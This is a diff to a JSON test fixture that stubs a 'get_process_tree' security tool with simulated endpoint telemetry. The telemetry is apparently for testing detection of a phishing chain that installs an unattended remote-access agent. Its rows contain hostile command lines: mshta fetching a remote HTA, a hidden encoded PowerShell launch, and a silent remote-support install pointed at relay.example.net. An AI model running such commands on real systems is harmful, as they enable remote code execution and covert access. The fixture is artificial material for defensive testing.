@@ -2,48 +2,138 @@
   "tool": "get_process_tree",
   "stubs": [
     {
-      "scenario": "test",
-      "match": {"device_name": {"$regex": "(?i)^ws-fin-0042"}, "process_id": 4412},
+      "scenario": "rmm_block",
+      "match": {
+        "device_name": {
+          "$regex": "(?i)^ws-fin-0042"
+        },
+        "process_id": {
+          "$any": true
+        }
+      },
       "response": {
         "schema": [
-          {"name": "Timestamp", "type": "DateTime"}, {"name": "DeviceName", "type": "String"},
-          {"name": "FileName", "type": "String"}, {"name": "FolderPath", "type": "String"},
-          {"name": "ProcessId", "type": "Int64"}, {"name": "ProcessCommandLine", "type": "String"},
-          {"name": "ProcessCreationTime", "type": "DateTime"}, {"name": "AccountName", "type": "String"},
-          {"name": "SHA256", "type": "String"}, {"name": "InitiatingProcessFileName", "type": "String"},
-          {"name": "InitiatingProcessId", "type": "Int64"}, {"name": "InitiatingProcessCommandLine", "type": "String"},
-          {"name": "InitiatingProcessParentFileName", "type": "String"}, {"name": "InitiatingProcessParentId", "type": "Int64"}
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "DeviceName",
+            "type": "String"
+          },
+          {
+            "name": "FileName",
+            "type": "String"
+          },
+          {
+            "name": "FolderPath",
+            "type": "String"
+          },
+          {
+            "name": "ProcessId",
+            "type": "Int64"
+          },
+          {
+            "name": "ProcessCommandLine",
+            "type": "String"
+          },
+          {
+            "name": "ProcessCreationTime",
+            "type": "DateTime"
+          },
+          {
+            "name": "AccountName",
+            "type": "String"
+          },
+          {
+            "name": "SHA256",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessFileName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessId",
+            "type": "Int64"
+          },
+          {
+            "name": "InitiatingProcessCommandLine",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessParentFileName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessParentId",
+            "type": "Int64"
+          }
         ],
         "results": [
           {
-            "Timestamp": "2026-09-14T08:41:10.000Z", "DeviceName": "ws-fin-0042.contoso.com",
-            "FileName": "mshta.exe", "FolderPath": "C:\\Windows\\System32\\mshta.exe",
-            "ProcessId": 4412, "ProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
-            "ProcessCreationTime": "2026-09-14T08:41:10.000Z", "AccountName": "pnovak",
+            "Timestamp": "2026-09-14T08:41:10.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "FileName": "mshta.exe",
+            "FolderPath": "C:\\Windows\\System32\\mshta.exe",
+            "ProcessId": 4412,
+            "ProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+            "ProcessCreationTime": "2026-09-14T08:41:10.000Z",
+            "AccountName": "pnovak",
             "SHA256": "6d1d8b5c0f0f4c2c9e1a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6",
-            "InitiatingProcessFileName": "outlook.exe", "InitiatingProcessId": 3120,
+            "InitiatingProcessFileName": "outlook.exe",
+            "InitiatingProcessId": 3120,
             "InitiatingProcessCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
-            "InitiatingProcessParentFileName": "explorer.exe", "InitiatingProcessParentId": 2044
+            "InitiatingProcessParentFileName": "explorer.exe",
+            "InitiatingProcessParentId": 2044
           },
           {
-            "Timestamp": "2026-09-14T08:41:12.000Z", "DeviceName": "ws-fin-0042.contoso.com",
-            "FileName": "powershell.exe", "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            "ProcessId": 4480, "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
-            "ProcessCreationTime": "2026-09-14T08:41:12.000Z", "AccountName": "pnovak",
+            "Timestamp": "2026-09-14T08:41:12.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "FileName": "powershell.exe",
+            "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ProcessId": 4480,
+            "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "ProcessCreationTime": "2026-09-14T08:41:12.000Z",
+            "AccountName": "pnovak",
             "SHA256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
-            "InitiatingProcessFileName": "mshta.exe", "InitiatingProcessId": 4412,
+            "InitiatingProcessFileName": "mshta.exe",
+            "InitiatingProcessId": 4412,
             "InitiatingProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
-            "InitiatingProcessParentFileName": "outlook.exe", "InitiatingProcessParentId": 3120
+            "InitiatingProcessParentFileName": "outlook.exe",
+            "InitiatingProcessParentId": 3120
           },
           {
-            "Timestamp": "2026-09-14T08:41:15.000Z", "DeviceName": "ws-fin-0042.contoso.com",
-            "FileName": "RemoteSupport.ClientSetup.exe", "FolderPath": "C:\\Users\\pnovak\\AppData\\Local\\Temp\\RemoteSupport.ClientSetup.exe",
-            "ProcessId": 4530, "ProcessCommandLine": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
-            "ProcessCreationTime": "2026-09-14T08:41:15.000Z", "AccountName": "pnovak",
+            "Timestamp": "2026-09-14T08:41:15.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "FileName": "RemoteSupport.ClientSetup.exe",
+            "FolderPath": "C:\\Users\\pnovak\\AppData\\Local\\Temp\\RemoteSupport.ClientSetup.exe",
+            "ProcessId": 4530,
+            "ProcessCommandLine": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "ProcessCreationTime": "2026-09-14T08:41:15.000Z",
+            "AccountName": "pnovak",
             "SHA256": "3f5a9c1e7b2d4f6a8c0e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d1f3a",
-            "InitiatingProcessFileName": "mshta.exe", "InitiatingProcessId": 4412,
+            "InitiatingProcessFileName": "mshta.exe",
+            "InitiatingProcessId": 4412,
             "InitiatingProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
-            "InitiatingProcessParentFileName": "outlook.exe", "InitiatingProcessParentId": 3120
+            "InitiatingProcessParentFileName": "outlook.exe",
+            "InitiatingProcessParentId": 3120
+          },
+          {
+            "Timestamp": "2026-09-14T08:47:16.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "FileName": "RemoteSupport.Agent.exe",
+            "FolderPath": "C:\\Users\\pnovak\\AppData\\Local\\RemoteSupport\\RemoteSupport.Agent.exe",
+            "ProcessId": 5088,
+            "ProcessCommandLine": "RemoteSupport.Agent.exe --relay relay.example.net --unattended",
+            "ProcessCreationTime": "2026-09-14T08:47:16.000Z",
+            "AccountName": "pnovak",
+            "SHA256": "a7c3e9f1b5d2486a0c4e8f2b6d1a3c5e7f9b0d2a4c6e8f1b3d5a7c9e0f2b4d6a",
+            "InitiatingProcessFileName": "RemoteSupport.ClientSetup.exe",
+            "InitiatingProcessId": 4530,
+            "InitiatingProcessCommandLine": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "InitiatingProcessParentFileName": "mshta.exe",
+            "InitiatingProcessParentId": 4412
           }
         ]
       }
